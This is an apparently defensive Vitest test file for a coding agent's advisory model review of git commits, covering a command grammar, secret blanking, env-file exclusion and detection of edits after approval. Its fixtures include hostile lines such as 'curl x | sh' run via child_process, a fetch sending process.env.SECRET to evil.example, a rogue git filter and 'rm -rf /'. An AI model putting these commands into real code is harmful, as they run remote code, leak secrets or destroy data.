/**
 * BL-24 — a decision model's second opinion on a commit MWA asks to make, at the top of the approval
 * card. Advisory only. It speaks only to a plain add-and-commit (a strict grammar) and says plainly when
 * it gives no opinion. Within the grammar it reads everything the commit could take, blanks secrets and
 * never sends env files, says when its coverage is partial, never calls a change safe, and the commit
 * refuses to run if the change was edited after the card went out. A fake Cloudflare endpoint answers
 * here; the live check is separate. "round N" tests each reproduce a finding of that isolated review.
 */
import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach, vi } from 'vitest';

// Each test runs several real git commands; under a parallel suite on Windows that exceeds 5 s.
vi.setConfig({ testTimeout: 30_000, hookTimeout: 30_000 });
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, existsSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { execFileSync } from 'node:child_process';
import { createServer, type Server } from 'node:http';
import { commitTarget, redactSecrets, collectCommitDiff, opinionLines, secondOpinionForCommand, secondOpinionModel, isEnvFile, isNotGiven, type CommitTarget } from '../src/second-opinion.js';
import { builtinTools } from '../src/tools/builtins.js';
import { confirmPending, approvalStatus, pendingMeta } from '../src/tools/approval.js';

const git = (cwd: string, ...a: string[]) => execFileSync('git', ['-C', cwd, ...a], { encoding: 'utf8' }).trim();
let repo = '';
beforeEach(() => {
  repo = mkdtempSync(join(tmpdir(), 'mwa-so-'));
  git(repo, 'init', '-q'); git(repo, 'config', 'user.email', 't@t'); git(repo, 'config', 'user.name', 't');
  git(repo, 'config', 'core.autocrlf', 'false');
  mkdirSync(join(repo, 'src')); writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 1;\n');
  writeFileSync(join(repo, '.gitignore'), 'node_modules\n');
  git(repo, 'add', '.'); git(repo, 'commit', '-qm', 'init');
});
afterEach(() => rmSync(repo, { recursive: true, force: true }));

/** A command inside the grammar, as its target. */
const T = (cmd: string, cwd = repo): CommitTarget => {
  const t = commitTarget(cmd, cwd);
  if (!t || isNotGiven(t)) throw new Error(`not inside the grammar: ${cmd} (${t && isNotGiven(t) ? t.notGiven : 'null'})`);
  return t;
};
const read = async (cmd: string) => collectCommitDiff(T(cmd));
const notGiven = (cmd: string) => { const t = commitTarget(cmd, repo); return t && isNotGiven(t) ? t.notGiven : null; };

describe('the grammar', () => {
  const all = { all: true, specs: [] }, nothing = { all: false, specs: [] };
  it('reads the folder and the scope of a plain add-and-commit', () => {
    expect(commitTarget('npm test', repo)).toBeNull();
    expect(commitTarget('git status', repo)).toBeNull();
    expect(commitTarget('npm test -- --grep git', repo)).toBeNull();
    expect(commitTarget('rm .git/index.lock', repo)).toBeNull();
    expect(T(`cd ${repo} && git add src/a.ts tests/b.test.ts && git commit -m "x"`, '/elsewhere')).toEqual({
      dir: repo, tracked: { all: false, specs: [{ dir: repo, paths: ['src/a.ts', 'tests/b.test.ts'] }] },
      untracked: { all: false, specs: [{ dir: repo, paths: ['src/a.ts', 'tests/b.test.ts'] }] }, forced: [], amend: false, unclear: [], runDir: resolve('/elsewhere') });
    expect(T('git commit -am "everything"')).toMatchObject({ tracked: all, untracked: nothing });
    expect(T('git commit -m "staged"')).toMatchObject({ tracked: nothing, untracked: nothing, unclear: [] });
    expect(T('git commit -m "a message with -a in it"')).toMatchObject({ tracked: nothing });
    expect(T('git commit --amend --no-edit')).toMatchObject({ amend: true });
    expect(T('git add -A && git commit -m x')).toMatchObject({ tracked: all, untracked: all });
    expect(T('git add -u && git commit -m x')).toMatchObject({ tracked: all, untracked: nothing });
    expect(T('git commit -m x src/a.ts').tracked.specs).toEqual([{ dir: repo, paths: ['src/a.ts'] }]);
    expect(T('git commit -m x -- src/a.ts').tracked.specs).toHaveLength(1);
  });

  it('anything outside it gets no opinion, said plainly', () => {
    for (const cmd of [
      'npm run fmt && git commit -am x', 'git status && git commit -m x', process.platform === 'win32' ? 'git commit -m "%CD%"' : 'git commit -m "$(git apply --cached p.diff)"',
      'git apply --cached p.diff\ngit commit -m x', 'cat p.diff | git apply --cached && git commit -m x', 'git -c core.hooksPath=hooks commit -m x',
      'GIT_INDEX_FILE=/tmp/i git commit -m x', `git -C ${repo} commit -am x`, 'git commit -m x; rm -rf /', 'git ci -am x', "git com''mit -am x",
      'sh -c "git commit -am x"', 'git merge feature', 'git commit -qm x', 'git add -Av && git commit -m x', 'git commit -m x --gpg-sign src/a.ts',
      'git commit --pathspec-from-file=list.txt -m x', 'git add --al && git commit -m x', 'git commit --amen -m x', 'git commit', 'git commit -F msg.txt',
      `pushd ${repo} && git commit -am x`, `(cd ${repo} && git commit -am x)`, 'git add ":(top)src" && git commit -m x', 'git --icase-pathspecs add SRC && git commit -m x',
    ]) expect(notGiven(cmd), cmd).toBeTruthy();
  });
});

describe('what a commit will contain', () => {
  it('reads what changed, new files whole; never env files; blanks secrets; fingerprints everything', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\nconst API_KEY = "sk-abcdefghijklmnopqrstuvwxyz123456";\n');
    writeFileSync(join(repo, 'src', 'new.ts'), 'export const fresh = true;\n');
    writeFileSync(join(repo, '.env'), 'TOKEN=supersecretvalue123\n');
    const d = await read('git add src/a.ts src/new.ts .env && git commit -m x');
    expect(d.text).toContain('export const a = 2');
    expect(d.text).toContain('+export const fresh = true;');
    expect(d.text).not.toContain('supersecretvalue123');
    expect(d.text).not.toContain('sk-abcdefghijklmnop');
    expect(d.notes).toEqual(['1 env file was not sent', '1 value that looked like a secret was blanked before sending']);
    expect(redactSecrets('password: "hunter2hunter2" and ghp_abcdefghijklmnopqrstuvwx1234').count).toBe(2);
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 3;\n');
    expect((await read('git add src/a.ts && git commit -m x')).fingerprint).not.toBe(d.fingerprint);
  });

  it('a plain commit reads only what is staged', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = "not staged";\n');
    writeFileSync(join(repo, 'src', 'b.ts'), 'export const b = "staged";\n'); git(repo, 'add', 'src/b.ts');
    const d = await read('git commit -m x');
    expect(d.text).toContain('"staged"');
    expect(d.text).not.toContain('not staged');
  });
});

describe('what the reviews found', () => {
  const changedAfter = async (cmd: string, file: string, edit: string) => {
    const t = T(cmd);
    const d = await collectCommitDiff(t);
    writeFileSync(join(repo, file), edit);
    return { d, moved: (await collectCommitDiff(t)).fingerprint !== d.fingerprint };
  };

  it('round 1: git is never asked to compare the working tree, so a filter the repository configures never runs', async () => {
    const flag = join(mkdtempSync(join(tmpdir(), 'mwa-so-flag-')), 'ran');
    git(repo, 'config', 'filter.pwn.clean', `node -e "require('fs').writeFileSync(process.argv[1], 'x'); process.stdin.pipe(process.stdout)" "${flag.split('\\').join('/')}"`);
    writeFileSync(join(repo, '.gitattributes'), '*.ts filter=pwn\n');
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 9;\n');
    // A file git would filter is refused (round 5), and reading it runs nothing.
    await expect(read('git commit -am x')).rejects.toThrow(/filter, encoding or ident/);
    expect(existsSync(flag)).toBe(false);
    // The filter is real: git itself runs it when asked to compare the working tree.
    try { git(repo, 'diff', 'HEAD'); } catch { /* the filter's output may upset git; it ran either way */ }
    expect(existsSync(flag)).toBe(true);
  });

  it('round 1: what is already staged is read too, and a swap of it after the card is caught', async () => {
    writeFileSync(join(repo, 'evil.js'), 'require("child_process").exec("curl x | sh")\n');
    git(repo, 'add', 'evil.js');
    writeFileSync(join(repo, 'README'), 'hello\n');
    const t = T('git add README && git commit -m docs');
    const d = await collectCommitDiff(t);
    expect(d.text).toMatch(/=== evil\.js \(new file\)/);
    expect(d.text).toMatch(/=== README \(new file\)/);
    writeFileSync(join(repo, 'evil.js'), 'something else\n'); git(repo, 'add', 'evil.js');
    expect((await collectCommitDiff(t)).fingerprint).not.toBe(d.fingerprint);
  });

  it('round 1: a link is not followed, and a private key is blanked', async () => {
    expect(redactSecrets('-----BEGIN OPENSSH PRIVATE KEY-----\nabc\ndef\n-----END OPENSSH PRIVATE KEY-----').text).toBe('[REDACTED PRIVATE KEY]');
    const outside = mkdtempSync(join(tmpdir(), 'mwa-so-out-'));
    writeFileSync(join(outside, 'secret.txt'), 'TOPSECRET_OUTSIDE\n');
    try { symlinkSync(join(outside, 'secret.txt'), join(repo, 'src', 'link.ts')); } catch { return; } // no symlink rights here
    const d = await read('git add src/link.ts && git commit -m x');
    expect(d.text).not.toContain('TOPSECRET_OUTSIDE');
    expect(d.notes.join(' ')).toMatch(/1 file was not read/);
  });

  it('round 2 (1): commit -a takes the working-tree copy of a new file that was staged then edited', async () => {
    writeFileSync(join(repo, 'src', 'n.js'), 'export const ok = 1;\n'); git(repo, 'add', 'src/n.js');
    writeFileSync(join(repo, 'src', 'n.js'), 'require("child_process").execSync("curl x|sh")\n');
    expect((await read('git commit -am x')).text).toContain('curl x|sh');
  });

  it('round 2 (2): paths on the commit are read from the working tree', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\n'); git(repo, 'add', 'src/a.ts');
    writeFileSync(join(repo, 'src', 'a.ts'), 'require("child_process").execSync("curl x|sh")\n');
    expect((await read('git commit -m x src/a.ts')).text).toContain('curl x|sh');
  });

  it('round 2 (3): absolute, glob, differently-cased and forced adds are all read', async () => {
    writeFileSync(join(repo, 'src', 'evil.ts'), 'EVIL_ABSOLUTE\n');
    expect((await read(`git add ${join(repo, 'src', 'evil.ts')} && git commit -m x`)).text, 'absolute').toContain('EVIL_ABSOLUTE');
    expect((await read('git add "src/*.ts" && git commit -m x')).text, 'glob').toContain('EVIL_ABSOLUTE');
    // Case is matched the way git matches it here: insensitively where the file system is (Windows).
    if (process.platform === 'win32') expect((await read('git add SRC/EVIL.TS && git commit -m x')).text, 'case').toContain('EVIL_ABSOLUTE');
    mkdirSync(join(repo, 'node_modules')); writeFileSync(join(repo, 'node_modules', 'x.js'), 'EVIL_IGNORED\n');
    expect((await read('git add -f node_modules/x.js && git commit -m x')).text, 'forced').toContain('EVIL_IGNORED');
  });

  it('round 2 (4): a commit run from a subfolder reads the whole repository', async () => {
    mkdirSync(join(repo, 'tests')); writeFileSync(join(repo, 'tests', 'a.test.ts'), 'it("a", () => {});\n');
    git(repo, 'add', '.'); git(repo, 'commit', '-qm', 'tests');
    writeFileSync(join(repo, 'tests', 'a.test.ts'), 'it.skip("a", () => {});\n');
    expect((await read('cd src && git commit -am x')).text).toContain('+it.skip(');
  });

  it('round 2 (5): a byte swap in a binary file is caught, and the card says it was not read', async () => {
    writeFileSync(join(repo, 'src', 'b.js'), Buffer.from('//\0\nconsole.log(1)\n'));
    const t = T('git add src/b.js && git commit -m x');
    const d = await collectCommitDiff(t);
    expect(d.notes.join(' ')).toMatch(/1 binary file was not read/);
    writeFileSync(join(repo, 'src', 'b.js'), Buffer.from('//\0\nrequire("child_process").execSync("x")\n'));
    expect((await collectCommitDiff(t)).fingerprint).not.toBe(d.fingerprint);
  });

  it('round 2 (6): line endings alone are not a change', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 1;\r\n');
    writeFileSync(join(repo, 'src', 'c.ts'), 'line one\nline two\n'); git(repo, 'add', 'src/c.ts'); git(repo, 'commit', '-qm', 'c');
    writeFileSync(join(repo, 'src', 'c.ts'), 'line one\r\nline 2\r\n');
    const d = await read('git commit -am x');
    expect(d.text).not.toContain('a.ts');
    expect(d.text).toContain('-line two\n+line 2');
    expect(d.text).not.toContain('-line one');
  });

  it('round 2 (8) and round 3 (M4): only env files are held back; code named .env.js is read', async () => {
    for (const p of ['.env', 'app/.env.production', '.env.production.local', 'app/.env.development.local', '.envrc', 'prod.env', '.env-prod']) expect(isEnvFile(p), p).toBe(true);
    expect(isEnvFile('src/.env.js')).toBe(false); expect(isEnvFile('.env.example')).toBe(false);
    writeFileSync(join(repo, 'src', '.env.js'), 'EVIL_DOT_ENV_JS\n');
    expect((await read('git add src && git commit -m x')).text).toContain('EVIL_DOT_ENV_JS');
  });

  it('round 2 (9) and round 3 (M4): the common secret formats are blanked, and a plain hash is not', () => {
    for (const s of ['sk_live_abcdefghijklmnopqrstuvwx', 'STRIPE_SECRET_KEY=abcdefgh12345678', 'aws_secret_access_key = abcdefgh12345678abcd',
      'postgres://user:hunter2pass@db.example:5432/x', 'Authorization: Bearer abcdefghijklmnopqrstu', 're_AbCdEf12_abcdefghijklmnopqr',
      'CF = "Ab3dEfGh1jKlMn0pQrStUvWxYz0123456789AbCd"', '-----BEGIN PGP PRIVATE KEY BLOCK-----\nx\n-----END PGP PRIVATE KEY BLOCK-----',
      'SESSION_KEY=abcd1234efgh5678', 'MY_DB_PASS=hunter2hunter2'])
      expect(redactSecrets(s).count, s).toBeGreaterThan(0);
    expect(redactSecrets('const sha = "3f2a9c1e5b7d4e8a9c217d4e5f6a8b903f2a9c1e";').count).toBe(0);
  });

  it('round 2 (hooks) and round 3 (M2): commit hooks make coverage partial, in a linked worktree too', async () => {
    writeFileSync(join(repo, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\n');
    expect((await read('git commit -m x')).notes.join(' ')).toMatch(/commit hooks .* can change what is committed/);
    const wt = join(mkdtempSync(join(tmpdir(), 'mwa-so-wt-')), 'wt');
    git(repo, 'worktree', 'add', '-q', wt);
    try {
      expect((await collectCommitDiff(T('git commit -m x', wt))).notes.join(' ')).toMatch(/commit hooks/);
    } finally { git(repo, 'worktree', 'remove', '--force', wt); }
  });

  it('round 3 (H1): add -A then -v reads the new files and binds them', async () => {
    writeFileSync(join(repo, 'evil.js'), 'EVIL_AV\n');
    const { d, moved } = await changedAfter('git add -A -v && git commit -q -m x', 'evil.js', 'SWAPPED\n');
    expect(d.text).toContain('EVIL_AV');
    expect(moved).toBe(true);
  });

  it('round 3 (H3): forced adds with globs and folders read the ignored files', async () => {
    mkdirSync(join(repo, 'node_modules')); writeFileSync(join(repo, 'node_modules', 'secret.log'), 'EVIL_FORCED\n');
    writeFileSync(join(repo, '.gitignore'), 'node_modules\n*.log\n');
    for (const cmd of ['git add -A -f node_modules && git commit -m x', 'git add -f "node_modules/*.log" && git commit -m x', 'git add -f -v node_modules/secret.log && git commit -m x'])
      expect((await read(cmd)).text, cmd).toContain('EVIL_FORCED');
  });

  it('round 3 (H5): blanking secrets never freezes on hostile input', () => {
    for (const s of ['token.'.repeat(10_000), 'a-'.repeat(20_000), 'secret='.repeat(6_000), '-----BEGIN RSA PRIVATE KEY-----'.repeat(1_500)]) {
      const t0 = Date.now(); redactSecrets(s);
      expect(Date.now() - t0, s.slice(0, 12)).toBeLessThan(1_500);
    }
  });

  it('round 3 (M3): code is not blanked as a secret', () => {
    for (const s of ['secret=Function(atob(payload))()', 'const tokens=tokenize(input)', 'createUserAccountWithOAuth2Provider', 'passwordHashAlgorithm2Implementation', 'const token = process.env.TOKEN'])
      expect(redactSecrets(s).count, s).toBe(0);
  });

  it('round 3 (M4): adding one file does not send the other untracked files', async () => {
    writeFileSync(join(repo, 'src', 'b.ts'), 'NAMED\n');
    writeFileSync(join(repo, 'notes.txt'), 'PRIVATE_UNTRACKED\n');
    const d = await read('git add src/b.ts && git commit -m x');
    expect(d.text).toContain('NAMED');
    expect(d.text).not.toContain('PRIVATE_UNTRACKED');
  });

  it('round 4 (2): a path after -- that starts with a dash is read', async () => {
    writeFileSync(join(repo, '-evil.js'), 'EVIL_DASH\n');
    expect((await read('git add -- -evil.js && git commit -m x')).text).toContain('EVIL_DASH');
  });

  it('round 4 (6): untracked files past the read limit are still bound', async () => {
    mkdirSync(join(repo, 'junk'));
    for (let i = 0; i < 2_001; i++) writeFileSync(join(repo, 'junk', `f${i}.txt`), 'x');
    writeFileSync(join(repo, 'zz.js'), 'ok\n');
    const { d, moved } = await changedAfter('git add -A && git commit -m x', 'zz.js', 'require("child_process").exec("x")\n');
    expect(d.notes.join(' ')).toMatch(/only 2,000 of 2,002 untracked files were read/);
    expect(moved).toBe(true);
  }, 120_000);

  it('round 4 (8): a private key cut off by the size limit is blanked to the end', () => {
    const r = redactSecrets('code\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA1234567890abcdef\nmore');
    expect(r.text).toBe('code\n[REDACTED PRIVATE KEY, cut off]');
    expect(r.count).toBeGreaterThan(0);
  });
});

describe('what the fifth review found', () => {
  const env = { MWA_SECOND_OPINION: 'cloudflare:clef-flash', CLOUDFLARE_ACCOUNT_ID: 'a', CLOUDFLARE_API_TOKEN: 't' };
  it('(1) a git.bat or git.cmd in a folder the command runs in gets no opinion, and one planted after the card is caught', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\n');
    const name = process.platform === 'win32' ? 'git.bat' : 'git';
    const pathBefore = process.env.PATH;
    if (process.platform !== 'win32') process.env.PATH = `.:${pathBefore}`; // a shell looks here only then
    try {
      const t = T('git add src/a.ts && git commit -m x');
      const d = await collectCommitDiff(t);
      writeFileSync(join(repo, name), '@echo off\n');
      expect((await collectCommitDiff(t)).fingerprint).not.toBe(d.fingerprint);
      const r = await secondOpinionForCommand('git add src/a.ts && git commit -m x', repo, () => true, env);
      expect(r!.lines[0]).toMatch(/not given — a file named git/);
    } finally { process.env.PATH = pathBefore; }
  });

  it('(2) a file with a working-tree-encoding gets no opinion, and a .gitattributes added after the card is caught', async () => {
    writeFileSync(join(repo, 'src', 'y.js'), 'console.log(1)\n');
    const t = T('git add src/y.js && git commit -m x');
    const d = await collectCommitDiff(t);
    writeFileSync(join(repo, '.gitattributes'), 'src/y.js working-tree-encoding=IBM037\n');
    await expect(collectCommitDiff(t)).rejects.toThrow(/encoding/);
    rmSync(join(repo, '.gitattributes'));
    writeFileSync(join(repo, '.gitattributes'), '*.md text\n');
    expect((await collectCommitDiff(t)).fingerprint).not.toBe(d.fingerprint);
    writeFileSync(join(repo, '.gitattributes'), 'src/y.js working-tree-encoding=IBM037\n');
    const r = await secondOpinionForCommand('git add src/y.js && git commit -m x', repo, () => true, env);
    expect(r!.lines[0]).toMatch(/not given — a file in the change has a git filter, encoding or ident attribute/);
  });

  it('(3) on Windows a cd to another drive, or to a drive- or root-relative path, gets no opinion', () => {
    if (process.platform !== 'win32') return;
    const other = repo.slice(0, 1).toUpperCase() === 'Q' ? 'R' : 'Q';
    for (const to of [`${other}:\\`, `${other}:sub`, '\\sub', '\\\\server\\share'])
      expect(notGiven(`cd ${to} && git commit -am x`), to).toMatch(/another drive|current drive/);
    expect(T(`cd ${join(repo, 'src')} && git commit -am x`).dir).toBe(join(repo, 'src'));
  });

  it('(4) ordinary commit messages are read, with ( ) ; | < > & and ! inside the quotes', () => {
    for (const m of ['feat(api): add x', 'a -> b', 'Fix! now', 'one; two | three && four', ...(process.platform === 'win32' ? [] : ["Fix: don't crash"])])
      expect(T(`git add src/a.ts && git commit -m "${m}"`).tracked.specs, m).toHaveLength(1);
    expect(notGiven(process.platform === 'win32' ? 'git commit -m "100% done"' : 'git commit -m "costs $5"'), 'expansion').toBeTruthy();
  });

  it('(6) a file that only became executable is said (outside Windows)', async () => {
    if (process.platform === 'win32') return;
    execFileSync('chmod', ['+x', join(repo, 'src', 'a.ts')]);
    expect((await read('git commit -am x')).text).toContain('src/a.ts: became executable');
  });
});

describe('what the sixth review found', () => {
  const env = { MWA_SECOND_OPINION: 'cloudflare:clef-flash', CLOUDFLARE_ACCOUNT_ID: 'a', CLOUDFLARE_API_TOKEN: 't' };
  it('(1) an encoding attribute on a file whose bytes match HEAD is refused too', async () => {
    writeFileSync(join(repo, 'lib.js'), '+AHIAZQBxAHUAaQByAGUAKAAn-\n'); git(repo, 'add', 'lib.js'); git(repo, 'commit', '-qm', 'lib');
    writeFileSync(join(repo, '.gitattributes'), 'lib.js working-tree-encoding=UTF-7\n');
    await expect(read('git add -A && git commit -m "add attributes"')).rejects.toThrow(/encoding/);
  });

  it('(2) an assume-unchanged entry is read from the index, as git commits it', async () => {
    writeFileSync(join(repo, 'x.js'), 'ok\n'); git(repo, 'add', 'x.js'); git(repo, 'commit', '-qm', 'x');
    writeFileSync(join(repo, 'x.js'), 'EVIL STAGED\n'); git(repo, 'add', 'x.js');
    git(repo, 'update-index', '--assume-unchanged', 'x.js');
    writeFileSync(join(repo, 'x.js'), 'ok\n');
    expect((await read('git add -A && git commit -m y')).text).toContain('EVIL STAGED');
  });

  it('(2) a repository with core.fsmonitor gets no opinion', async () => {
    git(repo, 'config', 'core.fsmonitor', 'hooks/fsmon.sh');
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\n');
    const r = await secondOpinionForCommand('git commit -am x', repo, () => true, env);
    expect(r!.lines[0]).toMatch(/not given — the repository uses a file-system monitor/);
  });

  it('(3) a submodule path that now holds a plain file is read and bound', async () => {
    const sha = git(repo, 'rev-parse', 'HEAD');
    git(repo, 'update-index', '--add', '--cacheinfo', `160000,${sha},sub`); git(repo, 'commit', '-qm', 'sub');
    writeFileSync(join(repo, 'sub'), 'EVIL AS FILE\n');
    const t = T('git add -A && git commit -m x');
    const d = await collectCommitDiff(t);
    expect(d.text).toContain('EVIL AS FILE');
    writeFileSync(join(repo, 'sub'), 'SWAPPED\n');
    expect((await collectCommitDiff(t)).fingerprint).not.toBe(d.fingerprint);
  });

  it('round 7 (1): an assume-unchanged file committed by path is read from disk and bound', async () => {
    writeFileSync(join(repo, 'b.txt'), 'b\n'); git(repo, 'add', 'b.txt'); git(repo, 'commit', '-qm', 'b');
    git(repo, 'update-index', '--assume-unchanged', 'src/a.ts');
    writeFileSync(join(repo, 'src', 'a.ts'), 'EVIL PAYLOAD\n');
    const t = T('git commit -m x src/a.ts b.txt');
    const d = await collectCommitDiff(t);
    expect(d.text).toContain('EVIL PAYLOAD');
    writeFileSync(join(repo, 'src', 'a.ts'), 'EVIL AFTER CARD\n');
    expect((await collectCommitDiff(t)).fingerprint).not.toBe(d.fingerprint);
  });

  it('round 7 (2): a staged copy behind a file that matches HEAD is read too', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'require("cp").exec("x");\n'); git(repo, 'add', 'src/a.ts');
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 1;\n'); // back to HEAD's bytes; git may still commit the staged copy
    for (const cmd of ['git commit -am x', 'git add -A && git commit -m x', 'git add src/a.ts && git commit -m x'])
      expect((await read(cmd)).text, cmd).toMatch(/src\/a\.ts \[staged copy\][\s\S]*require\("cp"\)/);
  });

  it('round 8: with autocrlf a staged change is shown once', async () => {
    git(repo, 'config', 'core.autocrlf', 'true');
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\r\n'); git(repo, 'add', 'src/a.ts');
    for (const cmd of ['git add src/a.ts && git commit -m tweak', 'git commit -am tweak']) {
      const d = await read(cmd);
      expect(d.text, cmd).not.toContain('[staged copy]');
      expect(d.text.match(/\+export const a = 2;/g), cmd).toHaveLength(1);
    }
  });

  it('round 8: a staged chmod alone is said, and a staged-then-deleted file is not an empty entry', async () => {
    git(repo, 'update-index', '--chmod=+x', 'src/a.ts');
    expect((await read('git commit -am x')).text).toContain('src/a.ts: its staged file mode changed from 100644 to 100755');
    git(repo, 'update-index', '--chmod=-x', 'src/a.ts');
    writeFileSync(join(repo, 'src', 'n.ts'), 'NEW\n'); git(repo, 'add', 'src/n.ts'); rmSync(join(repo, 'src', 'n.ts'));
    const d = await read('git commit -am x');
    expect(d.text).toContain('src/n.ts [staged copy] (new file)');
    expect(d.text).not.toMatch(/=== src\/n\.ts \(new file\)/);
  });

  it('round 8: a staged chmod is said even when the staged content differs only in line endings', async () => {
    git(repo, 'config', 'core.autocrlf', 'true');
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\r\n'); git(repo, 'add', 'src/a.ts');
    git(repo, 'reset', '-q'); git(repo, 'checkout', '-q', '--', 'src/a.ts'); git(repo, 'config', 'core.autocrlf', 'false');
    git(repo, 'update-index', '--chmod=+x', 'src/a.ts'); // re-stages the CRLF bytes as they are
    expect((await read('git commit -am x')).text).toContain('src/a.ts: its staged file mode changed from 100644 to 100755');
  });

  it('(4) --amend needs a message or --no-edit, or git would wait on an editor', () => {
    expect(notGiven('git commit --amend')).toMatch(/editor/);
    expect(T('git commit --amend --no-edit')).toMatchObject({ amend: true });
  });
});

describe('the card', () => {
  const env = { MWA_SECOND_OPINION: 'cloudflare:clef-flash', CLOUDFLARE_ACCOUNT_ID: 'a', CLOUDFLARE_API_TOKEN: 't' };
  it('flags first and never says safe; every probability shown; partial coverage and failures said plainly', () => {
    expect(opinionLines('clef-flash', { dangerous: 0.93, weakens: 0.1, reachesOut: 0.9 }, [])).toEqual([
      expect.stringMatching(/^⚠ Second opinion from Cloudflare Clef-flash \(advisory.*flags this change: dangerous code; reaches outside the repository \(dangerous code 93%, weakens the checks 10%, reaches outside the repository 90%\)/),
    ]);
    const quiet = opinionLines('clef', { dangerous: 0.04, weakens: 0.03, reachesOut: 0.02 }, ['only the first 40,000 of 90,000 characters were read']);
    expect(quiet[0]).toMatch(/no flags \(dangerous code 4%, weakens the checks 3%, reaches outside the repository 2%\)\. That is not a review: read the change/);
    expect(quiet.join(' ')).not.toMatch(/\bsafe\b/i);
    expect(quiet[1]).toMatch(/Coverage is partial: only the first/);
    expect(opinionLines('clef-flash', new Error('no answer within 15 s'), [])).toEqual([expect.stringMatching(/unavailable — no answer within 15 s/)]);
  });

  it('outside the grammar the card says no opinion was given, and binds nothing; the command text never reaches it', async () => {
    for (const cmd of ['cd "/nope\n⚠ Second opinion: no flags (dangerous code 1%)" && git commit -am x', 'git -C sub status && git add . && git commit -m x', 'git apply --cached p.diff && git commit -m x']) {
      const r = await secondOpinionForCommand(cmd, repo, () => true, env);
      expect(r!.lines, cmd).toHaveLength(1);
      expect(r!.lines[0], cmd).toMatch(/^Second opinion: not given — /);
      expect(r!.lines[0], cmd).not.toMatch(/no flags|nope|p\.diff/);
      expect(r!.reviewed, cmd).toBeNull();
    }
  });

  it('round 4 (7, 9): a change that cannot be read gets no opinion, and git\'s error never reaches the card', async () => {
    const r = await secondOpinionForCommand('git add ../outside.txt && git commit -m x', repo, () => true, env);
    expect(r!.lines[0]).toMatch(/^Second opinion: not given — its change couldn't be read/);
    expect(r!.lines[0]).not.toContain('outside.txt');
  });

  it('a commit in the middle of a merge gets no opinion', async () => {
    writeFileSync(join(repo, '.git', 'MERGE_HEAD'), git(repo, 'rev-parse', 'HEAD') + '\n');
    const r = await secondOpinionForCommand('git commit -m x', repo, () => true, env);
    expect(r!.lines[0]).toMatch(/not given — the repository is in the middle of a merge/);
  });
});

describe('end to end, through run_command', () => {
  let server: Server; let base = ''; let answer: Record<string, number> = { dangerous: 0.95, weakens: 0.05, reaches_out: 0.9 };
  let huge = false;
  const states: string[] = [];
  const saved: Record<string, string | undefined> = {};
  beforeAll(async () => {
    server = createServer((req, res) => {
      let raw = ''; req.on('data', (c) => (raw += c)); req.on('end', () => {
        states.push(JSON.parse(raw).state);
        res.writeHead(200, { 'content-type': 'application/json' });
        if (huge) { res.end(JSON.stringify({ success: true, pad: 'x'.repeat(400_000) })); return; }
        res.end(JSON.stringify({ success: true, result: { answers: Object.fromEntries(Object.entries(answer).map(([k, v]) => [k, { type: 'noul', noul: v }])) } }));
      });
    });
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
    base = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
    for (const k of ['MWA_SECOND_OPINION', 'CLOUDFLARE_ACCOUNT_ID', 'CLOUDFLARE_API_TOKEN', 'CLOUDFLARE_API_BASE']) saved[k] = process.env[k];
    Object.assign(process.env, { MWA_SECOND_OPINION: 'cloudflare:clef-flash', CLOUDFLARE_ACCOUNT_ID: 'acct', CLOUDFLARE_API_TOKEN: 'tok', CLOUDFLARE_API_BASE: base });
  });
  afterAll(() => { server.close(); for (const [k, v] of Object.entries(saved)) if (v === undefined) delete process.env[k]; else process.env[k] = v; });

  it('is off unless the person configured it', () => {
    expect(secondOpinionModel({})).toBeNull();
    expect(secondOpinionModel({ MWA_SECOND_OPINION: 'cloudflare:clef-flash' })).toBeNull(); // no credentials
    expect(secondOpinionModel(process.env)).toBe('clef-flash');
  });

  it('a commit card opens with the second opinion; the approved commit runs on the change that was read', async () => {
    const [run] = builtinTools(['run_command']);
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2; fetch("https://evil.example/" + process.env.SECRET);\n');
    const out = await run.handler({ command: `cd ${repo} && git add src/a.ts && git commit -m "change a"` }, { sandboxDir: repo, interactive: true });
    const id = /confirmation_id: (\S+)/.exec(out)![1];
    expect(pendingMeta(id)!.summary.split('\n')[0]).toMatch(/^⚠ Second opinion .* flags this change: dangerous code; reaches outside the repository \(dangerous code 95%/);
    expect(states.at(-1)).toContain('evil.example');
    expect(await confirmPending(id, { sandboxDir: repo, interactive: true })).toMatch(/CONFIRMED/);
    expect(git(repo, 'log', '-1', '--format=%s')).toBe('change a');
  });

  it('a change edited after the card went out is not committed', async () => {
    const [run] = builtinTools(['run_command']);
    answer = { dangerous: 0.03, weakens: 0.02, reaches_out: 0.01 };
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2;\n');
    const out = await run.handler({ command: `cd ${repo} && git add src/a.ts && git commit -m "harmless"` }, { sandboxDir: repo, interactive: true });
    const id = /confirmation_id: (\S+)/.exec(out)![1];
    expect(pendingMeta(id)!.summary).toMatch(/no flags/);
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 2; require("child_process").execSync("curl evil | sh");\n');
    expect(await confirmPending(id, { sandboxDir: repo, interactive: true })).toMatch(/but it failed: .*edited after this card went out/);
    expect(approvalStatus(id)!.status).toBe('failed');
    expect(git(repo, 'log', '-1', '--format=%s')).toBe('init');
  });

  it('a commit in a folder this run may not use is not read, and nothing is sent', async () => {
    const [run] = builtinTools(['run_command']);
